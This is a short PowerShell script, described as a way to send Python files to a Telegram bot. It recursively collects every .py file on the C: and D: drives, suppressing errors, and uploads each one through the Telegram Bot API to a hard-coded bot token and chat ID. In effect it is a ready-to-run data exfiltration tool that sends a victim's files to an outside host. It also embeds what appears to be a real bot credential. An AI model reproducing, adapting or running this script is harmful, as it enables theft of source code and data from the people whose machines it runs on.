<#
.SYNOPSIS
Sends all .py files from specified drives to a Telegram bot.

.DESCRIPTION
This script works on Windows 7, 8.1, 10, 11 (PowerShell 3.0+). It uses .NET HttpClient
to upload each Python file as a 'document' to the Telegram Bot API.
Adjust $BotToken, $ChatId, and $Paths as needed.
#>

# === Configuration ===
$BotToken = '6149645127:AAH6yTfAvHk6b3LAoKSENEXZgev4l5xBUVI'
$ChatId   = '956893993'
# List of drive roots or folders to search
$Paths    = @('C:\', 'D:\')

# Load HttpClient types
Add-Type -AssemblyName System.Net.Http

function Send-Document {
    param([string]$FilePath)

    # Create HTTP client and multipart content
    $client = [System.Net.Http.HttpClient]::new()
    $multipart = [System.Net.Http.MultipartFormDataContent]::new()

    # Read file bytes
    $bytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileContent = [System.Net.Http.ByteArrayContent]::new($bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')

    # Add 'document' (file) and 'chat_id' fields
    $multipart.Add($fileContent, 'document', [System.IO.Path]::GetFileName($FilePath))
    $multipart.Add([System.Net.Http.StringContent]::new($ChatId), 'chat_id')

    # Send request
    $response = $client.PostAsync("https://api.telegram.org/bot$BotToken/sendDocument", $multipart).Result

    # Cleanup
    $client.Dispose()
    $response.Dispose()
}

# Iterate through each path and send .py files
foreach ($path in $Paths) {
    Get-ChildItem -Path $path -Recurse -Filter *.py -File -ErrorAction SilentlyContinue | ForEach-Object {
        Send-Document $_.FullName
        Start-Sleep -Seconds 1
    }
}
